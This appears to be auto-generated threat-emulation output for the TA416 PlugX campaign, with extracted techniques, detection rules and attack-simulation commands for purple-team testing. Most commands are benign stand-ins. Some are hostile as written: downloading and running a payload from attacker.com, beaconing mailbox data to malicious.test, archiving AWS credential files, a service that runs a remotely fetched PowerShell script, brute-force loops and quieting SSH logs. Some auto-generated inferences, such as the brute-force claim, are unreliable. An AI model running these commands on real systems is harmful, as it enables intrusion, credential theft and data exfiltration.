extracted_ttps.description: TA416 uses phishing tactics to deliver emails impersonating European diplomatic entities, with the goal of infecting targets with PlugX malware
indicators: hxxps://www.dropbox[.]com/s/EU adopts conclusions on EU priorities in UN human rights

extracted_ttps.description: TA416 uses phishing emails with web bugs to profile victims before delivering malicious URLs with PlugX malware payloads
TA416 uses phishing emails to deliver malicious Zip files and establish initial access
TA416 uses web bugs to collect information about email recipients, including whether they open emails and are active
TA416 delivers malicious URLs with PlugX malware payloads to victims who have opened emails with web bugs
TA416 relies on the user to execute the malware, often through opening malicious PDF or ZIP files
indicators: Council conclusions on the European security situation.exe

extracted_ttps.description: Detected Phishing activity via NLP pattern matching
TA416 uses the Trident Loader method to execute PlugX malware, which may involve command and scripting interpreters
TA416 collects data from local systems, including files and directories
TA416 uses user execution to run malicious executables and establish persistence
No explicit mention of brute force, but TA416's use of phishing and malware suggests potential for brute force attacks
TA416 uses scheduled tasks to maintain persistence on compromised systems
TA416 modifies registry settings to evade detection
TA416 uses remote services to move laterally within compromised networks
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Network Service Discovery activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected User Execution: Malicious File activity via NLP pattern matching

rules.title: Detection: Phishing
rules.description: TA416 uses phishing tactics to deliver emails impersonating European diplomatic entities, with the goal of infecting targets with PlugX malware

rules.title: Email Collection via Web Bugs
rules.description: Detects potential email collection via web bugs by identifying HTTP GET requests for 1x1 pixel images or URLs containing typical tracking parameters

rules.title: Detection of User Execution via Malicious URLs with PlugX Malware
rules.description: This rule detects the execution of PlugX malware delivered through malicious URLs, as seen in TA416 campaigns. It focuses on the execution of the malware and related command-line activities.
falsepositives: Legitimate execution of cmd.exe with HTTP-related arguments for non-malicious purposes
Administrative or developer activities involving the execution of scripts or files from the internet

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detect Trident Loader Command and Scripting Interpreter
rules.description: Detects the use of Trident Loader to execute PlugX malware, which may involve command and scripting interpreters
falsepositives: Legitimate applications using similar command line arguments

rules.title: TA416 Data Collection
rules.description: Detects data collection activity associated with TA416
falsepositives: Legitimate downloads from the specified IP
False positives may occur if the IP is used for legitimate purposes

rules.title: Detection of Brute Force Attacks via Suspicious Command Line Activity
rules.description: Identifies potential brute force attacks by detecting suspicious command line activity, such as the use of powershell.exe with specific arguments, which could indicate attempts to guess or crack passwords.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Scheduled Task/Job Persistence via PotPlayer
rules.description: Detects the use of scheduled tasks to maintain persistence on compromised systems using PotPlayer

rules.title: Modify Registry via PotPlayer
rules.description: Detects modification of registry settings by PotPlayer to evade detection
falsepositives: Gaming or media software that uses similar executable names

rules.title: Remote Services Lateral Movement
rules.description: Detects potential lateral movement using remote services as seen in TA416 activity

rules.title: Create or Modify System Process via NLP Pattern Matching
rules.description: Detects Create or Modify System Process activity via NLP pattern matching

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection of Application Layer Protocol via NLP Pattern Matching
rules.description: Detects Application Layer Protocol activity via NLP pattern matching as used by UNC2596
falsepositives: Legitimate administrative tasks using powershell.exe for network requests
Penetration testing activities mimicking the detected pattern

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Obfuscated Files or Information Detection
rules.description: Detects Obfuscated Files or Information activity via NLP pattern matching
falsepositives: Legitimate use of base64 encoding for data transfer
Use of compression tools that utilize similar command line flags

rules.title: Detection: Exploit Public-Facing Application
rules.description: Detected Exploit Public-Facing Application activity via NLP pattern matching

rules.title: Detection: Network Service Discovery
rules.description: Detected Network Service Discovery activity via NLP pattern matching

rules.title: Archive Collected Data Detection
rules.description: Detects Archive Collected Data activity via process creation and command line analysis

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: User Execution: Malicious File
rules.description: Detects User Execution: Malicious File activity via NLP pattern matching
falsepositives: Legitimate users executing powershell.exe or cmd.exe with similar command line arguments
Administrators using these processes for system management tasks

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

attacks.description: Simulates retrieval of a malicious document from a remote server using certutil, mimicking post-phishing payload retrieval.
attacks.expected_behavior: Downloads a test file from a controlled URL to the user's TEMP directory. Uses built-in Windows utility certutil.exe. No execution occurs; file is saved as .txt for safety.

attacks.command: powershell -Command "mkdir '%TEMP%\EU_Diplomacy' -ErrorAction SilentlyContinue; $content = 'This is a simulated malicious document.'; Set-Content -Path '%TEMP%\EU_Diplomacy\Notice_From_EU.doc.txt' -Value $content -Force; Invoke-Item '%TEMP%\EU_Diplomacy\Notice_From_EU.doc.txt'"
attacks.description: Creates a disguised document in TEMP and opens it, simulating a phishing attachment that executes upon user interaction.
attacks.expected_behavior: Creates a directory and a text file with a .doc.txt extension to mimic a document, then opens it with the default viewer. Simulates user opening a phishing attachment. Uses PowerShell only where necessary (folder creation, file write).

attacks.description: Executes a Base64-encoded PowerShell command that exits with code 42, simulating execution of an encoded malicious payload from a phishing document.
attacks.expected_behavior: Decodes and runs a simple exit command (exit 42) to simulate execution flow of a malicious script. The Base64 string is UTF-16LE encoded as required. No persistence or harmful actions performed.

attacks.description: Download a malicious script via curl from a fake update server and execute it in the background.
attacks.expected_behavior: Silently downloads a script to a hidden directory, makes it executable, and runs it in the background. Simulates post-phishing payload execution.

attacks.command: mkdir -p $TMP/phishing_attach && echo 'Simulated PlugX payload stage' > $TMP/phishing_attach/.debug_log && chmod +x $TMP/phishing_attach/.debug_log && /bin/bash -c '$TMP/phishing_attach/.debug_log &'
attacks.description: Create a temporary directory, place a simulated malicious payload (benign string), and execute it as a background process.
attacks.expected_behavior: Creates a temporary working directory, writes a test string mimicking malware, and executes it via shell in the background to simulate persistence or beaconing behavior.

attacks.command: pkill -f bad_process; mkdir -p /tmp/.xorg_cache; wget -q -O /tmp/.xorg_cache/.launcher 'http://attacker.com/xorg_helper' 2>/dev/null || echo 'Download failed'; chmod 700 /tmp/.xorg_cache/.launcher; /tmp/.xorg_cache/.launcher &
attacks.description: Attempt to kill any existing malicious process (cleanup), then download and execute a new payload using wget into a hidden directory.
attacks.expected_behavior: Kills any prior instance of a fake malicious process, fetches a simulated payload, sets restrictive permissions, and executes it in the background. Mimics real-world persistence and evasion tactics after phishing.

attacks.description: Simulates a web bug by attempting to download a tracking resource from a remote server using certutil, a built-in Windows binary.
attacks.expected_behavior: Attempts to download a remote resource (e.g., tracking pixel). If the system allows outbound HTTP, the request may succeed and cache the file in %TEMP%. On air-gapped systems, it fails silently. No actual payload is harmful.

attacks.description: Uses bitsadmin to simulate downloading a tracking pixel when an email is opened, mimicking web bug behavior.
attacks.expected_behavior: Initiates a background download of a remote image file that could act as a web bug. The URL contains tracking parameters. If network is available, the request is made; otherwise, it fails. File is saved to %TEMP% and can be cleaned up.

attacks.command: powershell -Command "try { $wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'); $wc.DownloadString('http://example.com/api/log?ev=open&e=user@domain.com') | Out-Null } catch { } finally { if ($wc) { Remove-Variable wc } }"
attacks.description: Uses PowerShell WebClient to contact a tracking endpoint with email open event, simulating advanced web bug behavior with custom headers.
attacks.expected_behavior: Sends an HTTP GET request to a mock tracking server with event details. Runs silently on success or failure. Uses only built-in .NET classes via PowerShell (not direct reflection), and avoids unsafe practices. No data is parsed or stored locally.

attacks.description: Basic extraction of sender and subject lines from a local email file for reconnaissance.
attacks.expected_behavior: Reads a local test email file, extracts lines containing 'from' or 'subject', and saves them to a new file in the user's mail directory.

attacks.command: tar -czf $HOME/mail_archive_$(date +%s).tar.gz -C $HOME/.thunderbird/*.default/Mail/Local\ Mail/ inbox && curl -X POST --data-binary @$HOME/mail_archive_$(date +%s).tar.gz http://127.0.0.1:8080/upload
attacks.description: Intermediate command that compresses a local Thunderbird inbox directory and exfiltrates it via HTTP POST.
attacks.expected_behavior: Creates a timestamped gzipped tar archive of a simulated Thunderbird local inbox and attempts to upload it to a local test server (127.0.0.1:8080). If the server is not running, the curl command will fail silently.

attacks.command: find $HOME/.evolution/mail/local/ -name 'inbox' -type f -exec head -c 512 {} \; | base64 | xargs -I {} curl -X GET "http://malicious.test/beacon?data={}"
attacks.description: Advanced command that extracts the first 512 bytes of Evolution mail inbox files, base64-encodes them, and sends via HTTP GET to simulate beaconing behavior.
attacks.expected_behavior: Locates local Evolution inbox files, reads a small sample, encodes it, and appends it to a URL for exfiltration. The domain is benign and non-resolving, minimizing risk.

attacks.description: Download payload using certutil and execute via start command
attacks.expected_behavior: Downloads a file from a remote URL to the user's temp directory and launches it using the start command. Simulates user clicking on a downloaded executable from a malicious link.

attacks.description: Download JavaScript payload via PowerShell and execute
attacks.expected_behavior: Uses PowerShell to download a JavaScript file to temp and executes it. The script would typically be socially engineered to run via double-click, but here it's launched via command line to simulate user execution.

attacks.command: cmd.exe /c "echo This is a test payload > %TEMP%\document.pdf.exe && start %TEMP%\document.pdf.exe"
attacks.description: Create and execute a disguised executable file in temp
attacks.expected_behavior: Creates a benign executable-named file with a misleading extension (appearing as a PDF) and executes it. Simulates user opening a malicious attachment that masquerades as a document.

attacks.description: Download and execute a shell script from a remote server using curl
attacks.expected_behavior: Downloads a script to the temporary directory, makes it executable, and runs it. Simulates user clicking a link that triggers payload execution.

attacks.description: Silently download and source a hidden payload script using wget
attacks.expected_behavior: Downloads a payload with a hidden filename, sets restrictive permissions, and sources it in current shell context to simulate stealthy execution after user visits malicious link.

attacks.description: Download and execute a script directly in memory without writing to disk
attacks.expected_behavior: Fetches a script via HTTP and pipes it directly to bash for immediate execution. This leaves minimal forensic evidence and mimics drive-by download behavior after user clicks a malicious URL.

attacks.description: Download and execute a batch script using certutil, a built-in Windows binary, then run it via cmd.
attacks.expected_behavior: Downloads a batch file from a local server to the user's temp directory and executes it. Simulates initial staging activity using common living-off-the-land binary (LOLBAS).

attacks.description: Download a JScript file using PowerShell WebClient and execute it via cscript.
attacks.expected_behavior: Creates a subdirectory in TEMP, downloads a JScript file, and executes it using cscript with JScript engine. Mimics script-based payload execution common in loader techniques.

attacks.description: Create a scheduled task that runs a PowerShell command to download and execute a script on user logon with highest privileges.
attacks.expected_behavior: Registers a persistent scheduled task named 'UpdateHelper' that runs at logon with elevated privileges, fetching and executing a remote PowerShell script. Simulates persistence and execution via scripting interpreter.

attacks.description: Basic use of bash interpreter to simulate execution and logging
attacks.expected_behavior: Creates a log file in the user's cache directory with a test message

attacks.command: sh -c 'tmpfile=$(mktemp) && echo "#!/bin/bash\necho \"Delayed execution triggered\"" > $tmpfile && chmod +x $tmpfile && $tmpfile && rm -f $tmpfile'
attacks.description: Intermediate: Dynamically creates and executes a temporary script
attacks.expected_behavior: Generates a temporary script, executes it to print a message, then removes it

attacks.description: Advanced: Uses scripting interpreter to schedule persistent execution via cron (simulated beacon)
attacks.expected_behavior: Adds a cron job that would simulate periodic execution; in this case, only prints a test message if curl fails

attacks.description: Copy all files from the current user's Desktop to a temporary directory using legacy xcopy.
attacks.expected_behavior: Copies all files and subdirectories from the user's Desktop to %TEMP%\collected_data. Creates the destination if needed. Runs silently with no overwrite prompts.

attacks.description: Use robocopy to silently mirror the user's Documents folder to a temp location.
attacks.expected_behavior: Mirrors the contents of the Documents folder to %TEMP%\doc_backup. Uses built-in Windows tool with minimal output to avoid detection. Does not delete files in destination.

attacks.command: powershell -Command "mkdir '%TEMP%\\archive' -ErrorAction SilentlyContinue; Copy-Item '%APPDATA%\\*' '%TEMP%\\archive' -Recurse -ErrorAction SilentlyContinue; Compress-Archive -Path '%TEMP%\\archive' -DestinationPath '%TEMP%\\user_data.zip' -Force -ErrorAction SilentlyContinue; Remove-Item '%TEMP%\\archive' -Recurse -ErrorAction SilentlyContinue"
attacks.description: PowerShell script to copy AppData contents, compress into a ZIP file, and clean up intermediate directory.
attacks.expected_behavior: Creates a temporary archive of AppData, compresses it into user_data.zip in %TEMP%, then removes the unzipped folder. Uses only built-in PowerShell cmdlets with error suppression for robustness.

attacks.description: List files in common user directories to identify potential data of interest
attacks.expected_behavior: Outputs file listing from Documents and Downloads directories if they exist; suppresses errors for missing directories

attacks.description: Compress specific document types from user directories into an archive for exfiltration
attacks.expected_behavior: Creates a compressed archive in /tmp containing matching files; continues on error due to || true

attacks.command: find /home/$USER/Config /home/$USER/.aws -type f -name 'config' -o -name 'credentials' 2>/dev/null | xargs zip -j /tmp/secrets.zip 2>/dev/null || echo 'No sensitive files found'
attacks.description: Search for configuration and credential files in common paths and archive them
attacks.expected_behavior: Finds AWS or config files and adds them to a zip archive; outputs message if none are found

attacks.description: Creates a local test user with a weak password using built-in net.exe command. Simulates initial step before brute force or credential testing.
attacks.expected_behavior: Adds a local user named 'attacker' with password 'TestPass123' if executed with administrator privileges. Fails silently or with error if not elevated.

attacks.command: for /L %i in (1,1,5) do net.exe use \\localhost\c$ /user:attacker "WrongPass%i" 2>&1 > nul || echo Failed attempt %i
attacks.description: Simulates multiple failed login attempts using net use with incremental passwords. Represents brute force behavior against a local share.
attacks.expected_behavior: Attempts to connect to the C$ share with user 'attacker' and passwords WrongPass1 through WrongPass5. All attempts expected to fail. Output shows 'Failed attempt X' for each try.

attacks.command: powershell -Command "1..10 | ForEach-Object { $password = 'Password' + $_; cmd.exe /c "net use \\localhost\admin$ /user:Administrator '$password' 2>&1 > $null"; if ($LASTEXITCODE -ne 0) { Write-Output "Attempt $_: $password - Failed" } }"
attacks.description: PowerShell loop simulating 10 password guesses against the Administrator account using net use. Demonstrates scripted credential attempts.
attacks.expected_behavior: Executes 10 attempts to authenticate to the admin$ share with passwords Password1 through Password10. Each failed attempt logs a message. No actual authentication is expected to succeed.

attacks.command: for pass in password1 password2 password3; do ssh -o ConnectTimeout=5 -o BatchMode=yes user@127.0.0.1 "echo auth test" && echo "Success with $pass" && break || echo "Failed with $pass"; done
attacks.description: Basic brute force attempt over SSH using a small password list in a loop.
attacks.expected_behavior: Attempts SSH login with each password in sequence, exits on success or completes all attempts. Uses local loopback to avoid external network impact.

attacks.command: for pass in 'test123' 'admin' 'password'; do curl -s -o /dev/null -w "%{http_code}\n" --data "username=admin&password=$pass" http://localhost/login.php | grep -q "200" && echo "Valid credentials: admin:$pass" && break || echo "Attempt failed: $pass"; done
attacks.description: Intermediate HTTP login brute force using curl to submit form data and check response codes.
attacks.expected_behavior: Sends POST requests to a local login endpoint with different passwords, checks for HTTP 200 as success indicator. Runs entirely on localhost.

attacks.command: for pass in $(seq -f "pass%03g" 1 10); do (ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes user@127.0.0.1 "echo test" && echo "SUCCESS: $pass") || echo "Failed: $pass" & done; wait
attacks.description: Advanced brute force with parallel SSH attempts using background jobs and formatted password generation.
attacks.expected_behavior: Generates 10 passwords (pass001 to pass010), attempts SSH in parallel using background jobs, waits for all to complete. Targets localhost to limit network scope.

attacks.description: Creates a scheduled task using schtasks.exe that runs hourly and writes a timestamp to a log file in the temp directory.
attacks.expected_behavior: A scheduled task named 'UpdateCheck' is created and will execute hourly, appending output to %TEMP%\update.log. Requires elevated command prompt.

attacks.command: powershell -Command "try { $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo Intermediate task >> "%TEMP%\task_intermediate.log"'; $trigger = New-ScheduledTaskTrigger -Daily -At 9am; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries; Register-ScheduledTask -TaskName 'DailyMaintenance' -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM' -Force } catch { Write-Error $_ }"
attacks.description: Uses PowerShell to create a daily scheduled task running as SYSTEM that appends to a log file.
attacks.expected_behavior: Registers a task named 'DailyMaintenance' triggered daily at 9 AM, running as SYSTEM. Logs execution to %TEMP%\task_intermediate.log. Fails silently if unsupported.

attacks.command: cmd.exe /c "echo $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo Advanced persistence test > ^""%TEMP%\adv_task.log^""'; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1); Register-ScheduledTask -TaskName 'StealthUpdate' -Action $action -Trigger $trigger -User 'NT AUTHORITY\LOCAL SERVICE' -Force | Out-Null & exit" | powershell -EncodedCommand UwB0AGEAcgB0AC0AVAByAGEAbgBzAGYAZQByAF8AVABvAEsAZQB5AHMAdAByAGkAbgBnAA==
attacks.description: Executes an encoded PowerShell command via cmd to register a one-time scheduled task with delayed execution and low-visibility user context.
attacks.expected_behavior: After one minute, a task named 'StealthUpdate' runs once as LOCAL SERVICE and writes to %TEMP%\adv_task.log. The Base64-encoded command starts a PowerShell session safely without direct script block usage. Task is non-persistent after execution.

attacks.description: Installs a user-level cron job that runs at reboot to append a test string to a log file in /tmp.
attacks.expected_behavior: The current user's crontab will be set to execute a command at boot that writes 'test_persistence' to /tmp/scheduled_job.log. No privilege escalation is needed.

attacks.description: Creates a system-wide cron job that runs hourly as root to log a test string.
attacks.expected_behavior: A new cron file is written to /etc/cron.d/ that executes every hour. It appends 'hourly_checkin' to /tmp/cron_hourly.log. Requires root privileges to write to /etc/cron.d/.

attacks.command:
printf '[Unit]
Description=Test Persistence Timer
[Timer]
OnBootSec=60
Persistent=true
[Install]
WantedBy=timers.target' > /etc/systemd/system/test-persistence.timer && printf '[Unit]
Description=Test Persistence Job
[Service]
Type=oneshot
ExecStart=/bin/sh -c "echo \"systemd_persistence\" >> /tmp/systemd_job.log"' > /etc/systemd/system/test-persistence.service && systemctl enable test-persistence.timer && systemctl start test-persistence.timer
attacks.description: Creates a systemd timer and service that runs a persistence check 60 seconds after boot.
attacks.expected_behavior: Two systemd unit files are created: a timer and a service. The timer triggers the service 60 seconds after boot. The service appends 'systemd_persistence' to /tmp/systemd_job.log. Requires root to write to /etc/systemd/system/ and manage services.

attacks.description: Basic registry modification using reg.exe to set a DWORD value indicating disabled security feature (simulated)
attacks.expected_behavior: Creates a new registry key under HKCU\Software\TestKey with value DisableAntiMalware=1. No system impact, purely test entry.

attacks.description: Intermediate: Uses PowerShell to safely create and modify a registry key, simulating debugger redirection (image hijacking) for evasion
attacks.expected_behavior: Ensures HKCU\Software\TestKey exists and sets a 'Debugger' string value pointing to notepad.exe. This simulates a binary proxy technique but does not affect real processes.

attacks.description: Advanced: Executes a Base64-encoded PowerShell command that sets an AutoRun value in the registry to simulate persistence/evasion
attacks.expected_behavior: Decodes and runs a command that sets an AutoRun entry under HKCU\Software\TestKey pointing to cmd.exe with benign arguments. Simulates stealthy registry modification via encoded execution.

attacks.command: echo '# TA416 test entry' | sudo tee -a /etc/syslog.conf
attacks.description: Appends a test comment to the syslog configuration file to simulate registry-like modification for evasion
attacks.expected_behavior: Adds a comment line to /etc/syslog.conf, which may affect logging behavior if directives are altered; requires root to write to the file

attacks.command: sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak && echo 'LogLevel QUIET' | sudo tee -a /etc/ssh/sshd_config
attacks.description: Backs up SSH daemon config and modifies log level to reduce logging, simulating stealthy configuration change
attacks.expected_behavior: Creates a backup of sshd_config and appends a directive to suppress log verbosity, potentially evading detection

attacks.command: sudo sed -i 's/^\s*PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config && sudo systemctl restart ssh
attacks.description: Modifies SSH configuration to disable root login, simulating an attacker altering system settings to control access
attacks.expected_behavior: Edits the SSH daemon configuration to disable root login and restarts the service to apply changes

attacks.command: net use \\REMOTE-HOST\IPC$ /user:DOMAIN\User Password123 & sc \\REMOTE-HOST create EvilService binPath= "cmd.exe /c notepad.exe" & sc \\REMOTE-HOST start EvilService
attacks.description: Creates a service on a remote host using net and sc to establish remote execution via service control manager
attacks.expected_behavior: Authenticates to remote host IPC$, creates a service named 'EvilService' with benign payload (notepad.exe), starts the service, and executes notepad on the remote system if permissions allow

attacks.command: powershell -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c start calc.exe' -ComputerName REMOTE-HOST -EnableAllPrivileges"
attacks.description: Uses PowerShell WMI to remotely create a process on a target system
attacks.expected_behavior: Uses WMI over PowerShell to execute calc.exe on the remote host REMOTE-HOST, simulating lateral movement via WMI

attacks.command: cmd.exe /c "echo calc.exe | powershell -Command \"$sess = New-PSSession -ComputerName REMOTE-HOST; Invoke-Command -Session $sess -ScriptBlock { cmd.exe /c ($input | Out-String) }; Remove-PSSession $sess\""
attacks.description: Establishes a PowerShell remoting session (WinRM) to execute a command remotely
attacks.expected_behavior: Creates a PowerShell remoting session to REMOTE-HOST, executes calc.exe via command input, and cleans up the session. Simulates lateral movement via WinRM

attacks.description: Basic SSH command execution on a remote host to simulate lateral movement
attacks.expected_behavior: Connects to the remote host via SSH and creates a test file in /tmp. No data exfiltration or privilege escalation occurs.

attacks.description: Copy a local file to a remote system using SCP to simulate data staging for lateral movement
attacks.expected_behavior: Transfers a local file to the remote system's /tmp directory. Assumes SSH keys or passwordless login is configured. No destructive actions occur.

attacks.description: Establish a background SSH tunnel to forward local port 8080 to a remote internal host, simulating tunneling for lateral movement
attacks.expected_behavior: Creates a local port forward through the SSH jump host to access an internal service. Runs in background. No data is modified, but network exposure is increased temporarily.

attacks.description: Adds a registry entry to execute a command at user logon using reg.exe.
attacks.expected_behavior: Command writes a benign string to a file in %TEMP% when the user logs in. The registry persistence is user-level and does not require admin rights.

attacks.description: Creates a daily scheduled task that runs a command as SYSTEM using schtasks.exe.
attacks.expected_behavior: A scheduled task is created to run daily at 2 AM, writing a test message to %TEMP%. Requires admin rights due to SYSTEM context usage.

attacks.command: sc create "FakeService" binPath= "cmd.exe /c echo Service started > %TEMP%\\service_log.txt" start= auto && sc start "FakeService"
attacks.description: Creates and starts a Windows service using sc.exe to achieve persistence.
attacks.expected_behavior: A new service named 'FakeService' is created and started, writing a log entry to %TEMP%. This runs in the background and persists across reboots. Admin rights are required.

attacks.command: echo '@reboot /bin/sh -c "while true; do echo \"test\" >> /tmp/persistence.log; sleep 60; done"' | crontab -
attacks.description: Adds a cron job that runs at reboot to execute a persistent background loop logging every minute
attacks.expected_behavior: Installs a user-level cron job that starts at reboot and appends 'test' to /tmp/persistence.log every 60 seconds. Does not require root if user crontab is allowed.

attacks.description: Appends a command to ~/.bashrc to execute a background task on user login
attacks.expected_behavior: Modifies the current user's ~/.bashrc to run a delayed command upon shell login, appending a message to /tmp/bg_log.txt. This persists across user sessions and does not require admin privileges.

attacks.description: Download a file using certutil over HTTP, simulating C2 beaconing via application layer protocol (HTTP). Uses built-in Windows binary.
attacks.expected_behavior: Sends HTTP GET request to test-c2.example.com, saves response to %TEMP%\debug.log. No payload is malicious. Network log should show HTTP traffic to the domain.

attacks.description: Query TXT record from a domain mimicking DNS tunneling behavior, a common C2 technique using application layer protocol (DNS).
attacks.expected_behavior: Performs DNS TXT query for beacon.test-c2.example.com. Simulates DNS-based C2 communication. No data exfiltration occurs. Observable via DNS logs.

attacks.description: Send JSON beacon via HTTPS POST using PowerShell, simulating advanced C2 communication with structured data in request body.
attacks.expected_behavior: Sends a POST request with JSON body to test-c2.example.com/beacon. Uses PowerShell for structured data transmission. No sensitive data transmitted. Detectable via command-line and network monitoring.

attacks.description: Basic HTTP GET request to simulate beaconing to a C2 server using curl
attacks.expected_behavior: Sends a silent HTTP GET request to localhost:8080/beacon; used to simulate periodic C2 beaconing

attacks.description: Intermediate command simulating data exfiltration: writes test data, uploads via POST, then deletes local file
attacks.expected_behavior: Creates a temporary file with benign data, sends it via HTTP POST to localhost, then removes the file; simulates data exfiltration over HTTP

attacks.description: Advanced obfuscated command: executes a base64-encoded curl command to simulate encoded C2 communication
attacks.expected_behavior: Decodes and executes a base64-encoded HTTP request, simulating obfuscated C2 traffic over HTTP

attacks.description: Basic obfuscation: Decodes a Base64 string (harmless sentence) using certutil, a built-in Windows binary.
attacks.expected_behavior: Creates a file in %TEMP%\b64.txt containing the decoded text: 'the quick brown fox jumps over the lazy dog'. Uses certutil, a legitimate Windows tool, to decode.

attacks.description: Intermediate obfuscation: Captures process list as JSON, then encodes the file content in Base64 using PowerShell.
attacks.expected_behavior: Generates a JSON file of running processes, then creates a Base64-encoded version in %TEMP%. Demonstrates multi-stage obfuscation using native PowerShell cmdlets safely.

attacks.command: powershell -Command "mkdir '%TEMP%\obf' -ErrorAction SilentlyContinue; $content = 'test data for obfuscation'; Set-Content -Path '%TEMP%\obf\data.txt' -Value $content -Force; Compress-Archive -Path '%TEMP%\obf\data.txt' -DestinationPath '%TEMP%\obf\archive.zip' -Force; $zipBytes = [System.IO.File]::ReadAllBytes('%TEMP%\obf\archive.zip'); $b64 = [Convert]::ToBase64String($zipBytes); Set-Content -Path '%TEMP%\obf\archive.b64' -Value $b64 -Force"
attacks.description: Advanced obfuscation: Compresses a text file into a ZIP archive and then encodes the binary archive in Base64 using PowerShell.
attacks.expected_behavior: Creates a directory in %TEMP%, writes a benign text file, compresses it, and then outputs a Base64-encoded version of the ZIP file. Simulates how malware might package and hide payloads.

attacks.description: Basic obfuscation using base64 encoding of a simple shell command
attacks.expected_behavior: Decodes the base64 string 'echo test payload' and executes it via sh, printing 'test payload' to stdout

attacks.description: Intermediate obfuscation using base64-encoded gzipped data containing a shell command
attacks.expected_behavior: Decodes and decompresses a gzipped payload containing 'echo test payload' and executes it, printing 'test payload' to stdout

attacks.description: Advanced obfuscation with nested base64 encoding and command substitution
attacks.expected_behavior: Decodes a base64 string that itself contains a base64 command, evaluates it in shell, and outputs 'test payload'

attacks.description: Download and execute a payload from a local attacker-controlled server using certutil, simulating post-exploitation activity after exploiting a public-facing app.
attacks.expected_behavior: Attempts to download a file from a local HTTP server and execute it. Fails silently if server is unreachable. Uses built-in certutil for download, common in real attacks.

attacks.command: netsh advfirewall firewall add rule name="Allow Inbound NC" dir=in action=allow protocol=TCP localport=4444 && sc.exe create ReverseShell binPath="cmd.exe /c powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.1:8080/connect.ps1')\"" start=auto && sc.exe start ReverseShell
attacks.description: Simulate exploitation by creating a firewall rule and service that downloads and runs a remote script, mimicking post-exploit persistence.
attacks.expected_behavior: Adds a firewall rule to allow inbound traffic on port 4444 and creates/starts a service that attempts to download and execute a PowerShell script. Requires admin rights. Uses built-in netsh and sc.exe for stealth.

attacks.description: Send a POST request with a command injection payload to a vulnerable public-facing web application endpoint.
attacks.expected_behavior: Sends a JSON payload to a local web server, simulating command injection exploitation. Uses built-in PowerShell with proper quote escaping. No payload execution on target; only network interaction.

attacks.description: Basic probe of a CGI endpoint on a public-facing web server to check for potential vulnerability.
attacks.expected_behavior: Sends a silent GET request to a local CGI script endpoint. No data is modified. Used to test if a CGI interface is exposed.

attacks.command: for user in admin test user; do ssh -o BatchMode=yes -o ConnectTimeout=5 $user@localhost 'echo test' 2>/dev/null || echo "Failed: $user"; done
attacks.description: Intermediate simulation of targeted SSH login attempts against localhost using common usernames.
attacks.expected_behavior: Attempts SSH connections with predefined usernames to localhost. Uses echo test as a benign remote command. Fails silently if connection fails. Simulates credential probing without password spraying.

attacks.description: Advanced simulation of reverse shell exploitation using netcat and a named pipe, representing post-exploitation access.
attacks.expected_behavior: Sets up a reverse shell pipeline that connects back to two local ports (4444 and 4445). Requires netcat listeners to be active. Demonstrates exploitation leading to command execution. Use only in isolated test environments.

attacks.description: Lists all computers in the current domain or workgroup that are visible on the network.
attacks.expected_behavior: Displays a list of computers and their comment fields as shared resources on the network. Fails silently if no computers are found or network discovery is disabled.

attacks.description: Queries the Service Control Manager on the local system to list all installed services.
attacks.expected_behavior: Outputs a list of services with their names, display names, states (e.g., RUNNING), and start types. This is a standard method for service enumeration.

attacks.command: powershell -Command "Get-WmiObject -Class Win32_Service | Select-Object Name, State, StartMode, PathName | Format-Table -AutoSize"
attacks.description: Uses PowerShell and WMI to retrieve detailed information about installed services including their executable paths.
attacks.expected_behavior: Displays a formatted table of services showing name, current state, startup mode, and binary path. Useful for identifying potential misconfigurations or unusual service paths.

attacks.description: Basic network service discovery using netstat to list listening TCP and UDP ports
attacks.expected_behavior: Lists all listening TCP and UDP ports with no host name resolution. Shows services bound to interfaces. Runs quickly and safely on any Linux system with netstat installed.

attacks.description: Intermediate network service discovery using ss (socket statistics) to list listening services
attacks.expected_behavior: Displays listening TCP and UDP sockets. More efficient than netstat and preferred on modern Linux systems. Output includes local addresses and ports in use.

attacks.description: Advanced network service discovery using nmap to detect version information of services running on localhost
attacks.expected_behavior: Scans localhost to identify open ports and attempts to determine service versions. Requires nmap; may need root for full accuracy. Limited to local host to ensure safety.

attacks.description: Basic archiving of a single collected data file using Compress-Archive
attacks.expected_behavior: Creates a test file in %TEMP% and compresses it into data.zip using PowerShell. Archive overwrites if already present.

attacks.command: cmd.exe /c "echo log1 > %TEMP%\log1.txt && echo log2 > %TEMP%\log2.txt && powershell -Command "Compress-Archive -Path '%TEMP%\log*.txt' -DestinationPath '%TEMP%\logs.zip' -Force; attrib +H '%TEMP%\logs.zip'"
attacks.description: Intermediate: Archives multiple log files and hides the resulting archive
attacks.expected_behavior: Creates two test log files, archives them into a hidden logs.zip file in %TEMP%.

attacks.command: cmd.exe /c "echo secret > %TEMP%\secret.txt && echo cache > %TEMP%\cache.tmp && powershell -Command "& { $files = Get-ChildItem '%TEMP%' -Filter 's*.txt'; $dest = '%TEMP%\payload.zip'; Compress-Archive -Path $files.FullName -DestinationPath $dest -Force }; Remove-Item '%TEMP%\secret.txt' -ErrorAction SilentlyContinue"
